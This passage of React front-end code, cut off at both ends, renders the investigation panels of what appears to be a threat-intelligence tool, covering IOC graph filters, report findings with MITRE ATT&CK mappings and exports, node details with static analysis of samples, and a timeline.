                    ? { background: color + '33', borderColor: color, color }
                    : { background: 'transparent', borderColor: color + '66', color: color + '88' }
                  }
                >
                  {type}
                </button>
              )
            })}
          </div>
        )}

        {/* Edge-relation filter row. Shows once we have ≥2 distinct relations
            on the graph. Click a chip to mute that relation type — useful for
            collapsing noisy historical / co_resolves links on dense graphs.
            Frontend-only (no data is lost). */}
        {existingRelations.size >= 2 && (
          <div className="filter-bar filter-bar-relations">
            <span className="filter-bar-label">edges</span>
            {[...existingRelations].sort().map(rel => {
              const active = !filterRelations.has(rel)
              return (
                <button
                  key={rel}
                  className={`filter-chip relation-chip${active ? '' : ' off'}`}
                  onClick={() => toggleFilterRelation(rel)}
                  title={active ? `Hide ${rel} edges` : `Show ${rel} edges`}
                >
                  {rel}
                </button>
              )
            })}
          </div>
        )}

        {/* Legend — hidden when filter bar is active (they'd both show at bottom-left) */}
        {existingTypeList.length === 0 && (
          <div className="legend">
            {Object.entries(NODE_COLORS).filter(([k]) => k !== 'report').map(([type, color]) => (
              <span key={type} className="legend-item">
                <span className="legend-dot" style={{ background: color }} />
                {type}
              </span>
            ))}
          </div>
        )}
        </div>{/* .filter-bars */}
      </div>

      {/* ── RIGHT RESIZE HANDLE ── */}
      <div className="resize-handle" onMouseDown={startDrag('right')} title="Drag to resize" />

      {/* ── RIGHT PANEL ── */}
      <div className={`details${mobileRightOpen ? ' mobile-open' : ''}`}>
        {/* Tab bar */}
        <div className="panel-tabs">
          <button
            className={`panel-tab${rightTab === 'report' ? ' active' : ''}`}
            onClick={() => setRightTab('report')}
          >
            Report
          </button>
          <button
            className={`panel-tab${rightTab === 'node' ? ' active' : ''}`}
            onClick={() => setRightTab('node')}
          >
            Node
          </button>
          <button
            className={`panel-tab${rightTab === 'timeline' ? ' active' : ''}`}
            onClick={() => setRightTab('timeline')}
          >
            Timeline
          </button>
          <button
            className={`panel-tab${rightTab === 'actions' ? ' active' : ''}`}
            onClick={() => setRightTab('actions')}
            title="Operational deliverables — blocklists, takedown templates, detection rules"
          >
            Actions
          </button>
          <button
            className={`panel-tab${rightTab === 'chat' ? ' active' : ''}`}
            onClick={() => setRightTab('chat')}
          >
            Chat
          </button>
        </div>

        <div className={`panel-content${rightTab === 'chat' ? ' chat-mode' : ''}`}>
          {/* ── Report tab ── */}
          {rightTab === 'report' && (
            <>
              {/* Working hypothesis — phase-1.5 commit, written within the
                  first ~8 tool calls. Compact one-line summary by default;
                  expand to see evidence + plan. Two schemas in the wild:
                  organic (candidate_category / primary_evidence / plan_to_test)
                  vs mechanical fallback (category / evidence /
                  what_to_pursue_next) — read both.

                  Freshness: a hypothesis pinned at 8 nodes is stale once the
                  drain has added 40 more. Surface that delta + age so the
                  analyst doesn't mistake the early guess for current consensus.
                  Once the full investigation_summary report is rendered below,
                  the hypothesis is mostly a historical artefact — collapse it
                  hard and dim it. */}
              {hypothesis && (() => {
                const cat = hypothesis.category || hypothesis.candidate_category
                const altCat = hypothesis.alternate_category
                const reasonText = hypothesis.reason
                  || hypothesis.rationale
                  || hypothesis.summary
                const evidenceList = Array.isArray(hypothesis.evidence)
                  ? hypothesis.evidence
                  : (Array.isArray(hypothesis.primary_evidence)
                      ? hypothesis.primary_evidence
                      : [])
                const nextRaw = hypothesis.what_to_pursue_next
                  ?? hypothesis.plan_to_test
                  ?? hypothesis.next_pivots
                const nextList = Array.isArray(nextRaw)
                  ? nextRaw
                  : (typeof nextRaw === 'string' && nextRaw.trim()
                      ? [nextRaw]
                      : [])
                const newNodes = hypothesisStamp
                  ? Math.max(0, nodeCount - hypothesisStamp.nodeCountAt)
                  : 0
                const ageSec = hypothesis._ts ? Math.max(0, (Date.now() / 1000) - hypothesis._ts) : 0
                const ageLabel = ageSec < 90
                  ? 'just now'
                  : ageSec < 3600
                    ? `${Math.round(ageSec / 60)} min ago`
                    : ageSec < 86400
                      ? `${Math.round(ageSec / 3600)} h ago`
                      : `${Math.round(ageSec / 86400)} d ago`
                // "Stale" heuristic: hypothesis was written when the graph
                // was small, and a lot has been added since. Tunable; this
                // is purely a UX hint, not a backend signal.
                const isStale = newNodes >= 15
                const supersededByReport = !!report
                return (
                  <details
                    className={`hypothesis-card${supersededByReport ? ' superseded' : ''}${isStale ? ' stale' : ''}`}
                    /* Collapsed by default — full report (below) is the
                       primary surface. Expand on click for the rationale. */
                  >
                    <summary>
                      <span className="hypothesis-label">hypothesis</span>
                      {cat && (
                        <span className="hypothesis-cat">
                          {String(cat).replace(/_/g, ' ')}
                        </span>
                      )}
                      {hypothesis.confidence && (
                        <span className="hypothesis-conf">
                          {hypothesis.confidence}
                        </span>
                      )}
                      <span className="hypothesis-meta">
                        {ageLabel}
                        {newNodes > 0 && (
                          <span className={isStale ? 'hypothesis-stale' : ''}>
                            {` · +${newNodes} node${newNodes === 1 ? '' : 's'} since`}
                          </span>
                        )}
                        {supersededByReport && ' · superseded by report ↓'}
                      </span>
                    </summary>
                    <div className="hypothesis-body">
                      {altCat && (
                        <div className="hypothesis-alt">
                          alt: {String(altCat).replace(/_/g, ' ')}
                        </div>
                      )}
                      {reasonText && (
                        <div className="hypothesis-reason">{String(reasonText)}</div>
                      )}
                      {evidenceList.length > 0 && (
                        <ul className="hypothesis-evidence">
                          {evidenceList.slice(0, 4).map((ev, i) => <li key={i}>{String(ev)}</li>)}
                        </ul>
                      )}
                      {nextList.length > 0 && !supersededByReport && (
                        <div className="hypothesis-next">
                          <span className="hypothesis-next-label">plan: </span>
                          {nextList.slice(0, 4).map((p, i) => (
                            <span key={i} className="hypothesis-pivot-chip">{String(p)}</span>
                          ))}
                        </div>
                      )}
                    </div>
                  </details>
                )
              })()}
              {/* Budget-extension log (R4): collapsed by default, useful only
                  when investigating why the agent kept pivoting past 60 calls. */}
              {budgetLog.length > 0 && (
                <details className="budget-log-card" style={{
                  border: '1px solid var(--border)', borderRadius: 6,
                  padding: '4px 10px', marginBottom: 8, fontSize: 12, opacity: 0.85
                }}>
                  <summary style={{ cursor: 'pointer' }}>
                    Budget extensions ({budgetLog.length})
                  </summary>
                  <ul style={{ margin: '6px 0 0', paddingLeft: 18 }}>
                    {budgetLog.map((b, i) => (
                      <li key={i}>
                        <strong>round {b.round ?? '?'}</strong>
                        {typeof b.metadata.calls_so_far !== 'undefined' && (
                          <> — {b.metadata.calls_so_far} calls</>
                        )}
                        {typeof b.metadata.discriminating_fingerprints_last5 !== 'undefined' && (
                          <>, +{b.metadata.discriminating_fingerprints_last5} fingerprints</>
                        )}
                        {b.metadata.reason && <div style={{ opacity: 0.75 }}>{String(b.metadata.reason)}</div>}
                      </li>
                    ))}
                  </ul>
                </details>
              )}
              {!report && (
                <p className="hint">Click the ★ report node for the full investigation summary.</p>
              )}
              {report && (
                <>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span className={`threat-badge threat-${(report.threat_assessment || 'unknown').replace(/\s+/g, '_')}`}>
                      {(report.threat_assessment || 'UNKNOWN').toUpperCase()}
                    </span>
                    {/* The report node is upserted as soon as the agent reaches
                        STEP 8 in phase 1 — phases 1.5 / 2 / 3 may still be
                        running and will refine the same node in place. Surface
                        a "still being refined" hint while inv.status === 'running'
                        so the analyst doesn't mistake the early draft for the
                        final report. */}
                    {(() => {
                      const inv = invs.find(i => i.id === activeInv)
                      return inv && inv.status === 'running' ? (
                        <span
                          className="report-refining-badge"
                          title="The agent is still running follow-up phases. The summary will be updated in place."
                        >
                          <span className="report-refining-dot" /> being refined…
                        </span>
                      ) : null
                    })()}
                    <button
                      className="btn-sm secondary export-btn"
                      style={{ marginLeft: 'auto' }}
                      onClick={copyReportMarkdown}
                      title="Copy the full report as markdown (paste into ticket / chat)"
                    >
                      {copied ? '✓ copied' : '↓ Copy MD'}
                    </button>
                    {activeInv && (
                      <button
                        className="btn-sm secondary export-btn"
                        onClick={() => window.open(`/api/investigations/${activeInv}/pdf`, '_blank')}
                        title="Download a structured PDF report for sharing"
                      >
                        PDF
                      </button>
                    )}
                    {activeInv && (
                      <button
                        className="btn-sm secondary export-btn"
                        onClick={() => window.open(`/api/investigations/${activeInv}/stix`, '_blank')}
                        title="Download STIX 2.1 bundle (JSON) for threat intel sharing"
                      >
                        STIX
                      </button>
                    )}
                    {activeInv && (
                      <button
                        className="btn-sm secondary export-btn"
                        onClick={() => window.open(`/api/investigations/${activeInv}/csv`, '_blank')}
                        title="Download observables as STIX-flavoured CSV (ready for an OpenCTI workbench)"
                      >
                        CSV
                      </button>
                    )}
                    {activeInv && (
                      <button
                        className="btn-sm export-btn share-btn"
                        onClick={() => setShareOpen(true)}
                        title="Generate a share link (graph-only, with optional report/timeline/evidence/chats)"
                      >
                        ↗ Partager
                      </button>
                    )}
                  </div>

                  {report.summary && (
                    <div style={{ fontSize: 13, lineHeight: 1.6, color: 'var(--on-surface)' }}>
                      <HighlightedText text={report.summary} nodeValues={nodeValues} onNodeClick={focusNode} />
                    </div>
                  )}

                  {/* Per-seed summaries (multi-seed investigations). Each seed
                      gets its own collapsible block with its own threat badge
                      and findings. Falls back gracefully: when the report is
                      single-seed flat, the block below doesn't render. */}
                  {report.per_seed_summaries && Object.keys(report.per_seed_summaries).length > 0 && (
                    <div>
                      <div className="section-label" style={{ margin: '8px 0 6px' }}>Per-seed</div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                        {Object.entries(report.per_seed_summaries).map(([seedVal, s], i) => {
                          const nodeId = nodeValues.get(seedVal)
                          const ta = (s?.threat_assessment || 'unknown').toString()
                          return (
                            <details key={i} className="per-seed-card" open>
                              <summary className="per-seed-header">
                                <span className={`threat-badge threat-${ta.replace(/\s+/g, '_')}`}>
                                  {ta.toUpperCase()}
                                </span>
                                <span
                                  className={`per-seed-value${nodeId ? ' clickable' : ''}`}
                                  onClick={nodeId ? (e) => { e.preventDefault(); focusNode(nodeId) } : undefined}
                                  title={nodeId ? 'Focus this seed on the graph' : undefined}
                                >
                                  {iocString(seedVal)}
                                </span>
                                {s?.type && <span className="per-seed-type">{s.type}</span>}
                              </summary>
                              {s?.summary && (
                                <div className="per-seed-summary">
                                  <HighlightedText text={s.summary} nodeValues={nodeValues} onNodeClick={focusNode} />
                                </div>
                              )}
                              {Array.isArray(s?.key_findings) && s.key_findings.length > 0 && (
                                <div style={{ display: 'flex', flexDirection: 'column', gap: 4, marginTop: 6 }}>
                                  {s.key_findings.map((f, j) => {
                                    const text = typeof f === 'string' ? f : iocString(f.text)
                                    const srcs = typeof f === 'object' && f !== null ? (f.sources || []) : []
                                    return (
                                      <div key={j} className="finding-card">
                                        <div className="finding-text">
                                          <HighlightedText text={text} nodeValues={nodeValues} onNodeClick={focusNode} />
                                        </div>
                                        {srcs.length > 0 && (
                                          <div className="finding-sources">
                                            {srcs.map((src, k) => (
                                              <span key={k} className="source-chip">{iocString(src)}</span>
                                            ))}
                                          </div>
                                        )}
                                      </div>
                                    )
                                  })}
                                </div>
                              )}
                            </details>
                          )
                        })}
                      </div>
                    </div>
                  )}

                  {/* Cross-seed findings: explicit attributes shared across seeds
                      (IP, NS, cert, JARM, ASN, registrant, hash). Empty array
                      also means "no shared infrastructure observed" — still
                      useful, but we omit the section when missing/empty to
                      keep single-seed reports clean. */}
                  {Array.isArray(report.cross_seed_findings) && report.cross_seed_findings.length > 0 && (
                    <div>
                      <div className="section-label" style={{ margin: '8px 0 6px' }}>Cross-seed links</div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                        {report.cross_seed_findings.map((c, i) => {
                          const text = typeof c === 'string' ? c : iocString(c.text)
                          const seeds = (typeof c === 'object' && Array.isArray(c.seeds)) ? c.seeds : []
                          const sources = (typeof c === 'object' && Array.isArray(c.sources)) ? c.sources : []
                          return (
                            <div key={i} className="finding-card cross-seed-card">
                              <div className="finding-text">
                                <HighlightedText text={text} nodeValues={nodeValues} onNodeClick={focusNode} />
                              </div>
                              {seeds.length > 0 && (
                                <div className="cross-seed-seeds">
                                  {seeds.map((sv, j) => {
                                    const nodeId = nodeValues.get(iocString(sv))
                                    return (
                                      <span
                                        key={j}
                                        className={`ioc-chip${nodeId ? ' clickable' : ''}`}
                                        onClick={nodeId ? () => focusNode(nodeId) : undefined}
                                      >
                                        {iocString(sv)}
                                      </span>
                                    )
                                  })}
                                </div>
                              )}
                              {sources.length > 0 && (
                                <div className="finding-sources">
                                  {sources.map((src, j) => (
                                    <span key={j} className="source-chip">{iocString(src)}</span>
                                  ))}
                                </div>
                              )}
                            </div>
                          )
                        })}
                      </div>
                    </div>
                  )}

                  {report.key_findings?.length > 0 && (
                    <div>
                      <div className="section-label" style={{ margin: '8px 0 6px' }}>Key findings</div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                        {report.key_findings.map((f, i) => {
                          const text = typeof f === 'string' ? f : iocString(f.text)
                          const sources = typeof f === 'object' && f !== null ? (f.sources || []) : []
                          return (
                            <div key={i} className="finding-card">
                              <div className="finding-text">
                                <HighlightedText text={text} nodeValues={nodeValues} onNodeClick={focusNode} />
                              </div>
                              {sources.length > 0 && (
                                <div className="finding-sources">
                                  {sources.map((s, j) => (
                                    <span key={j} className="source-chip">{iocString(s)}</span>
                                  ))}
                                </div>
                              )}
                            </div>
                          )
                        })}
                      </div>
                    </div>
                  )}

                  {/* MITRE ATT&CK mapping — agent-validated list of
                      techniques the investigation observed. Each row links
                      to the technique page on attack.mitre.org. */}
                  {(() => {
                    const m = report.mitre_attack_mapping
                    let items = []
                    if (Array.isArray(m)) items = m
                    else if (m && Array.isArray(m.techniques)) items = m.techniques
                    if (!items || items.length === 0) return null
                    return (
                      <div>
                        <div className="section-label" style={{ margin: '8px 0 6px' }}>MITRE ATT&CK</div>
                        <div className="mitre-list">
                          {items.map((t, i) => {
                            const tid = t.technique_id || t.id || '?'
                            const name = t.technique_name || t.name || ''
                            const tactics = Array.isArray(t.tactics) ? t.tactics : (t.tactic ? [t.tactic] : [])
                            const ev = t.evidence || t.rationale || ''
                            const conf = (t.confidence || '').toLowerCase()
                            const url = `https://attack.mitre.org/techniques/${tid.replace('.', '/')}/`
                            return (
                              <div key={i} className={`mitre-item${conf ? ` mitre-${conf}` : ''}`}>
                                <a href={url} target="_blank" rel="noopener noreferrer" className="mitre-id" title="Open on attack.mitre.org">
                                  {tid}
                                </a>
                                <div className="mitre-body">
                                  <div className="mitre-name">
                                    {name}
                                    {conf && <span className="mitre-conf">{conf}</span>}
                                  </div>
                                  {tactics.length > 0 && (
                                    <div className="mitre-tactics">
                                      {tactics.map(tac => (
                                        <span key={tac} className="mitre-tactic">{String(tac).replace(/_/g, ' ').replace(/-/g, ' ')}</span>
                                      ))}
                                    </div>
                                  )}
                                  {ev && <div className="mitre-ev">{String(ev)}</div>}
                                </div>
                              </div>
                            )
                          })}
                        </div>
                      </div>
                    )
                  })()}

                  {report.pivot_suggestions?.length > 0 && (
                    <div>
                      <div className="section-label" style={{ margin: '8px 0 6px' }}>Pivot suggestions</div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                        {report.pivot_suggestions.map((p, i) => (
                          <div key={i} className="pivot-item">
                            <span style={{ color: 'var(--primary)', flexShrink: 0 }}>›</span>
                            <span>{iocString(p)}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {report.ioc_list?.length > 0 && (
                    <div>
                      <div className="section-label" style={{ margin: '8px 0 6px' }}>IOC list</div>
                      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                        {report.ioc_list.map((ioc, i) => {
                          const label = iocString(ioc)
                          const nodeId = nodeValues.get(label)
                          return (
                            <span
                              key={i}
                              className={`ioc-chip${nodeId ? ' clickable' : ''}`}
                              onClick={nodeId ? () => focusNode(nodeId) : undefined}
                            >
                              {label}
                            </span>
                          )
                        })}
                      </div>
                    </div>
                  )}

                  {report.sources_used?.length > 0 && (
                    <div>
                      <div className="section-label" style={{ margin: '8px 0 6px' }}>Sources used</div>
                      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                        {report.sources_used.map((s, i) => (
                          <span key={i} className="source-chip">{iocString(s)}</span>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Analyst prompts moved to Chat tab */}
                  {Array.isArray(report.prompt_history) && report.prompt_history.length > 0 && (
                    <div>
                      <div className="section-label" style={{ margin: '12px 0 6px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                        <span>Analyst prompts ({report.prompt_history.length})</span>
                        <button className="btn-sm secondary" style={{ fontSize: 10, padding: '1px 8px' }} onClick={() => setRightTab('chat')}>Open Chat →</button>
                      </div>
                    </div>
                  )}
                </>
              )}

            </>
          )}

          {/* ── Node tab ── */}
          {rightTab === 'node' && (
            <>
              {!selected && (
                <p className="hint">Click a node in the graph to inspect it.</p>
              )}
              {selected && (
                <>
                  <div className="node-header">
                    <span
                      className="type-badge"
                      style={{
                        background: (NODE_COLORS[selected.type] || '#8b949e') + '2a',
                        borderColor: NODE_COLORS[selected.type] || '#8b949e',
                        color: NODE_COLORS[selected.type] || '#8b949e'
                      }}
                    >
                      {selected.type}
                    </span>
                    <span className="node-value">{selected.value}</span>
                  </div>

                  {(selected.tags || []).length > 0 && (
                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                      {selected.tags.map(t => (
                        <span key={t} className={`tag-chip tag-${t}`}>{t}</span>
                      ))}
                    </div>
                  )}

                  {/* Annotation row — Pin toggle + free-text note. Lives at the
                      top of the Node tab so it's the first thing analysts see
                      when triaging a node. Pin marks the node visually on the
                      graph (gold halo); note becomes a small badge under it. */}
                  {selected.type !== 'report' && (
                    <div className="annot-row">
                      <button
                        className={`btn-sm annot-pin${(selected.tags || []).includes('pinned') ? ' on' : ''}`}
                        onClick={() => togglePin(selected)}
                        title={(selected.tags || []).includes('pinned')
                          ? 'Unpin this node'
                          : 'Pin this node — highlights it on the graph for quick triage'}
                      >
                        {(selected.tags || []).includes('pinned') ? '📌 Pinned' : '📌 Pin'}
                      </button>
                      <input
                        className="annot-note-input"
                        value={noteDraft}
                        onChange={e => setNoteDraft(e.target.value)}
                        onBlur={() => {
                          const current = (selected.metadata?.user_note) || ''
                          if (current !== noteDraft) saveNote()
                        }}
                        onKeyDown={e => {
                          if (e.key === 'Enter') { e.preventDefault(); saveNote(); e.target.blur() }
                          if (e.key === 'Escape') { setNoteDraft((selected.metadata?.user_note) || ''); e.target.blur() }
                        }}
                        placeholder="Note (ex. VPN, C2, sinkhole)…"
                        maxLength={120}
                        disabled={noteBusy}
                      />
                      {noteDraft && (
                        <button
                          className="btn-sm secondary annot-clear"
                          onClick={() => { setNoteDraft(''); saveNote() }}
                          title="Clear note"
                        >✕</button>
                      )}
                    </div>
                  )}

                  {/* Sources seen — multi-source convergence indicator */}
                  {(() => {
                    const ss = (selected.metadata || {}).sources_seen || []
                    const count = ss.length
                    const convergenceColor = count >= 3 ? '#56d364' : count === 2 ? '#e3b341' : '#8b949e'
                    return ss.length > 0 ? (
                      <div>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, marginBottom: 4 }}>
                          <span style={{ color: 'var(--on-dim)' }}>Seen by:</span>
                          <span style={{
                            fontSize: 10, fontWeight: 'bold', padding: '1px 6px',
                            borderRadius: 8, background: convergenceColor + '22',
                            color: convergenceColor, border: `1px solid ${convergenceColor}44`
                          }}>
                            {count} source{count !== 1 ? 's' : ''}
                          </span>
                        </div>
                        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
                          {ss.map(s => (
                            <span key={s} className="source-chip">{s}</span>
                          ))}
                        </div>
                      </div>
                    ) : (
                      <div style={{ display: 'flex', gap: 12, fontSize: 11, color: 'var(--on-dim)' }}>
                        {selected.source && <span>src: <b style={{ color: 'var(--on-surface)' }}>{selected.source}</b></span>}
                      </div>
                    )
                  })()}

                  {/* Cross-investigation convergence — repeat infrastructure
                      across the user's prior investigations. High signal:
                      if the same JARM / registrant email / C2 IP shows up
                      in several past campaigns, it's almost certainly the
                      same actor cluster. */}
                  {selected.type !== 'report' && (
                    <div className="cross-inv-panel">
                      {crossInvLoading && (
                        <div className="cross-inv-loading">Checking prior investigations…</div>
                      )}
                      {!crossInvLoading && crossInvHits && crossInvHits.length === 0 && (
                        <div className="cross-inv-empty">
                          <span style={{ color: 'var(--on-dim)', fontSize: 10 }}>
                            First time this IOC appears in your investigation history.
                          </span>
                        </div>
                      )}
                      {!crossInvLoading && crossInvHits && crossInvHits.length > 0 && (
                        <div className="cross-inv-block">
                          <div className="cross-inv-header">
                            <span className="cross-inv-icon">↺</span>
                            <span className="cross-inv-title">
                              Also seen in {crossInvHits.length} prior investigation{crossInvHits.length !== 1 ? 's' : ''}
                            </span>
                          </div>
                          <div className="cross-inv-list">
                            {crossInvHits.slice(0, 6).map(h => (
                              <button
                                key={h.investigation_id}
                                className="cross-inv-item"
                                onClick={() => openInv(h.investigation_id)}
                                title={`Open this prior investigation (started ${new Date((h.investigation_created_at || 0) * 1000).toLocaleString()})`}
                              >
                                <span className="cross-inv-seed-type">{h.seed_type}</span>
                                <span className="cross-inv-seed-value">
                                  {h.title || h.seed_value}
                                </span>
                                {h.node_tags && h.node_tags.length > 0 && (
                                  <span className="cross-inv-tags">
                                    {h.node_tags.slice(0, 3).map(t => (
                                      <span key={t} className={`tag-chip tag-${t}`} style={{ fontSize: 9, padding: '0 4px' }}>{t}</span>
                                    ))}
                                  </span>
                                )}
                              </button>
                            ))}
                            {crossInvHits.length > 6 && (
                              <div className="cross-inv-more">
                                + {crossInvHits.length - 6} more
                              </div>
                            )}
                          </div>
                        </div>
                      )}
                    </div>
                  )}

                  <div style={{ display: 'flex', gap: 6 }}>
                    {PIVOTABLE.includes(selected.type) && (
                      <>
                        <button
                          className="btn-sm"
                          style={{ flex: 1 }}
                          onClick={() => pivotHere(selected)}
                          title="Run another agent pass on this graph from this node (enrich in place)"
                        >
                          ↳ Pivot here
                        </button>
                        <button
                          className="btn-sm secondary"
                          style={{ flex: 1 }}
                          onClick={() => pivot(selected)}
                          title="Send this IOC to the new-investigation form (creates a fresh graph)"
                        >
                          ⎘ New inv
                        </button>
                      </>
                    )}
                    <button
                      className="btn-sm secondary"
                      style={{ flex: 1 }}
                      onClick={() => copyNodeJson(selected)}
                    >
                      {copied ? '✓ copied' : '↓ Copy JSON'}
                    </button>
                  </div>

                  {/* Hash nodes: prominent filename block + copy-hash shortcut.
                      The graph label already shows file_name when present;
                      here we surface both fields explicitly so the analyst
                      can grab either one quickly. */}
                  {selected.type === 'hash' && (
                    <div className="hash-detail">
                      {(() => {
                        const md = selected.metadata || {}
                        const name = md.file_name
                          || (Array.isArray(md.names) && md.names[0])
                          || (Array.isArray(md.file_names) && md.file_names[0])
                          || md.meaningful_name
                        return name ? (
                          <div className="hash-detail-row">
                            <span className="hash-detail-label">filename</span>
                            <span className="hash-detail-value" title={String(name)}>{String(name)}</span>
                            <button
                              className="btn-sm secondary hash-copy-btn"
                              onClick={() => copyText(name)}
                              title="Copy filename"
                            >⧉</button>
                          </div>
                        ) : (
                          <div className="hash-detail-row muted">no filename in metadata</div>
                        )
                      })()}
                      <div className="hash-detail-row">
                        <span className="hash-detail-label">hash</span>
                        <span className="hash-detail-value mono" title={selected.value}>{selected.value}</span>
                        <button
                          className="btn-sm secondary hash-copy-btn"
                          onClick={() => copyText(selected.value)}
                          title="Copy hash"
                        >⧉</button>
                      </div>
                    </div>
                  )}

                  {/* Static analysis (uploaded samples only). Surfaces the
                      in-process PE/ELF + strings + entropy pass run on
                      upload. The agent reads the same payload via
                      metadata.static_analysis. */}
                  {selected.type === 'hash' && selected.metadata?.static_analysis && (() => {
                    const sa = selected.metadata.static_analysis
                    if (!sa || sa.error) return null
                    const pe = sa.pe || null
                    const elf = sa.elf || null
                    const packed = pe?.sections?.some(s => (s.entropy || 0) >= 7.5)
                    return (
                      <div className="static-analysis">
                        <div className="section-label" style={{ margin: '6px 0', display: 'flex', alignItems: 'center', gap: 6 }}>
                          Static analysis
                          {packed && <span className="sa-warn" title="A section has entropy ≥7.5 — likely packed/encrypted">packed?</span>}
                        </div>
                        <div className="sa-row">
                          <span className="sa-key">size</span>
                          <span className="sa-val">{sa.size?.toLocaleString()} bytes</span>
                        </div>
                        <div className="sa-row">
                          <span className="sa-key">entropy</span>
                          <span className="sa-val">{sa.entropy}</span>
                        </div>
                        {pe && (
                          <>
                            <div className="sa-row">
                              <span className="sa-key">arch</span>
                              <span className="sa-val">PE / {pe.machine}{pe.is_pe32_plus ? ' (PE32+)' : ''}</span>
                            </div>
                            {pe.compile_timestamp ? (
                              <div className="sa-row">
                                <span className="sa-key">compiled</span>
                                <span className="sa-val">
                                  {new Date(pe.compile_timestamp * 1000).toISOString().slice(0, 19).replace('T', ' ')}
                                </span>
                              </div>
                            ) : null}
                            {Array.isArray(pe.import_dlls) && pe.import_dlls.length > 0 && (
                              <div className="sa-row sa-row-wrap">
                                <span className="sa-key">imports</span>
                                <span className="sa-val sa-chips">
                                  {pe.import_dlls.map(d => (
                                    <span key={d} className="sa-chip">{d}</span>
                                  ))}
                                </span>
                              </div>
                            )}
                            {Array.isArray(pe.sections) && pe.sections.length > 0 && (
                              <div className="sa-sections">
                                <div className="sa-sections-header">sections</div>
                                {pe.sections.map(s => (
                                  <div key={s.name} className={`sa-section${s.entropy >= 7.5 ? ' sa-section-hot' : ''}`}>
                                    <span className="sa-section-name">{s.name || '<?>'}</span>
                                    <span className="sa-section-meta">
                                      {(s.virtual_size || 0).toLocaleString()}b · entropy {s.entropy}
                                    </span>
                                  </div>
                                ))}
                              </div>
                            )}
                          </>
                        )}
                        {elf && (
                          <div className="sa-row">
                            <span className="sa-key">arch</span>
                            <span className="sa-val">ELF{elf.ei_class} / {elf.machine}</span>
                          </div>
                        )}
                        {sa.strings && (
                          <div className="sa-row">
                            <span className="sa-key">strings</span>
                            <span className="sa-val">
                              {sa.strings.ascii_total?.toLocaleString() || 0} ascii
                              {sa.strings.utf16_total ? ` · ${sa.strings.utf16_total.toLocaleString()} utf16` : ''}
                            </span>
                          </div>
                        )}
                        {Array.isArray(sa.embedded_iocs) && sa.embedded_iocs.length > 0 && (
                          <div className="sa-iocs">
                            <div className="sa-iocs-header">{sa.embedded_iocs.length} IOCs embedded in strings</div>
                            <div className="sa-chips">
                              {sa.embedded_iocs.slice(0, 12).map((i, idx) => (
                                <span key={idx} className="sa-chip" title={i.value}>
                                  <span className="sa-chip-type">{i.type}</span>{i.value.length > 28 ? i.value.slice(0, 26) + '…' : i.value}
                                </span>
                              ))}
                              {sa.embedded_iocs.length > 12 && (
                                <span className="sa-chip-more">+ {sa.embedded_iocs.length - 12}</span>
                              )}
                            </div>
                          </div>
                        )}
                      </div>
                    )
                  })()}

                  <div>
                    <div className="section-label" style={{ margin: '8px 0 6px' }}>Metadata</div>
                    <pre className="meta-pre">{JSON.stringify(selected.metadata, null, 2)}</pre>
                  </div>

                  {/* Evidence — raw source data audit */}
                  {activeInv && selected.type !== 'report' && (
                    <div>
                      <div className="section-label" style={{ margin: '8px 0 6px', display: 'flex', alignItems: 'center', gap: 8 }}>
                        Evidence (raw data)
                        <button
                          className="btn-sm secondary"
                          style={{ fontSize: 10, padding: '1px 8px' }}
                          onClick={async () => {
                            setEvidenceLoading(true)
                            setEvidenceData(null)
                            try {
                              const r = await fetch(`/api/investigations/${activeInv}/nodes/${selected.id}/evidence`)
                              if (r.ok) {
                                const d = await r.json()
                                setEvidenceData(d.evidence || [])
                              }
                            } catch (_) {}
                            setEvidenceLoading(false)
                          }}
                        >
                          {evidenceLoading ? 'Loading...' : 'Load'}
                        </button>
                      </div>
                      {evidenceData && (
                        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                          {evidenceData.length === 0 && (
                            <div style={{ fontSize: 11, color: 'var(--on-dim)' }}>No cached source data found for this value.</div>
                          )}
                          {evidenceData.map((ev, i) => {
                            const keyParts = ev.cache_key.split('|')
                            const sourceLabel = keyParts.length > 1
                              ? keyParts[1].replace(/https?:\/\/[^/]+\//, '').split('/').slice(0, 2).join('/')
                              : ev.cache_key
                            return (
                              <details key={i} className="evidence-entry">
                                <summary className="evidence-summary">
                                  <span className="source-chip">{sourceLabel.length > 40 ? sourceLabel.slice(0, 38) + '...' : sourceLabel}</span>
                                  <span style={{ fontSize: 10, color: 'var(--on-dim)' }}>
                                    {ev.cached_at ? new Date(ev.cached_at * 1000).toLocaleString() : ''}
                                  </span>
                                </summary>
                                <pre className="meta-pre" style={{ maxHeight: 300, overflow: 'auto' }}>
                                  {JSON.stringify(ev.data, null, 2)}
                                </pre>
                              </details>
                            )
                          })}
                        </div>
                      )}
                    </div>
                  )}
                </>
              )}
            </>
          )}

          {/* ── Timeline tab ── */}
          {rightTab === 'timeline' && (
            <>
              <div className="section-label" style={{ margin: '0 0 8px' }}>Investigation Timeline</div>
              {(() => {
                const cy = cyRef.current
                if (!cy) return <p className="hint">No graph loaded.</p>
                // Build unified timeline: nodes + agent notes
                const entries = []
                cy.nodes().forEach(n => {
                  const d = n.data()
                  if (d.type === 'report') return
                  const md = d.metadata || {}
                  entries.push({
                    _kind: 'node', ts: d.created_at || 0,
                    id: d.id, type: d.type, value: d.value,
                    first_seen: md.first_seen || md.first_submission_date || md.creation_date || null,
                    sources_seen: md.sources_seen || [],
                    tags: d.tags || [],
                  })
                })
                // Merge agent notes (reasoning + tool calls + modifications)
                for (const note of agentNotes) {
                  entries.push({
                    _kind: note.noteKind, ts: note.ts,
                    text: note.text, detail: note.detail || null,
                    nodeId: note.nodeId || null,
                    nodeType: note.nodeType || null,
                  })
                }
                entries.sort((a, b) => (a.ts || 0) - (b.ts || 0))
                // Collapse consecutive tool calls into groups
                const merged = []
